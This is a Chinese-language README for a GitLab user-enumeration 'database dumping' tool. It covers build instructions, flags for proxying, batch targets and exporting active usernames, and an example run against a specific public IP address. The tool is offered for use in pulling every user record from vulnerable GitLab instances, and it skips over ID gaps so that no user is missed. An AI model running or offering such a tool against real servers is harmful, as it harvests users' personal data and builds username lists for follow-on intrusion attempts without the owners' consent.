# GitLab用户枚举拖库工具

# 一、解决了什么问题

gitlab有一个用户名枚举的漏洞：

```text
http://{host}/api/v4/users/{id}
```

这个工具就是用来将存在此种情况的gitlab的用户信息都拖下来。

亮点：

1. 如果某个用户被删除了会返回404，导致和看起来没有用户了一样，如果只是简单粗暴地判断响应为404就退出很可能会因为id空洞导致漏掉用户，本工具对这种情况是做了兼容的
2. 支持各种拖库、导出方式

# 二、下载安装

## 2.1 下载编译好的二进制文件

前往release页面根据自己的操作系统下载不同的二进制文件（暂未发布release版本）。

## 2.2 自己从源码编译

将项目克隆到本地： 
```bash
git clone https://github.com/CC11001100/gitlab-api-user-enum-exploit.git
```

Linux:

```bash
CGO_ENABLED=0 GOOS=linux GOARCH=amd64 go build -o gitlab-api-user-enum-exploit main.go
```

Windows:

```bash
SET CGO_ENABLED=0
SET GOOS=windows
SET GOARCH=amd64
go build -o gitlab-api-user-enum-exploit.exe main.go
```

# 三、使用案例

拖所有用户的信息，后面的用户id`1`具体是几不重要，只要是个数字就可以：

```text
gitlab-api-user-enum-exploit.exe run --api-url https://202.191.66.163/api/v4/users/1 --output-by-domain
```

# 四、使用文档

```text
Usage：
-api-url 有用户泄露的API地址，比如 https://foo.com/api/v4/users/1
-site 所关联的网站，比如 https://foo.com
-from-file 从文件中批量运行，文件中每行是一个api url或者domain
-cut-off 指定当遇到几个连续的404才认为是脱完了，在实际脱裤的时候注意到会遇到过这种情况，比如id为10的用户返回404，但是id为11的用户就能正常返回信息，实际的用户数是好几十，如果只是简单粗暴地判断返回404就认为是拖完了，
那么就会在id为10的时候退出，后面的好几十个用户都没拖到，这是不能够容忍的，所以就引入了这个机制来兼容一下这种情况，只有当遇到连续n个404时才认为是拖完了，程序才会退出。
-proxy 请求时使用代理
-request-max-try-times 请求失败重试次数
-output-json-line-file 把拉取到的所有用户的信息保存到一个JsonLine文件
-output-username-file 把active状态的用户单独保存到一个文件中
-output-by-domain 根据域名自动生成文件名保存
```

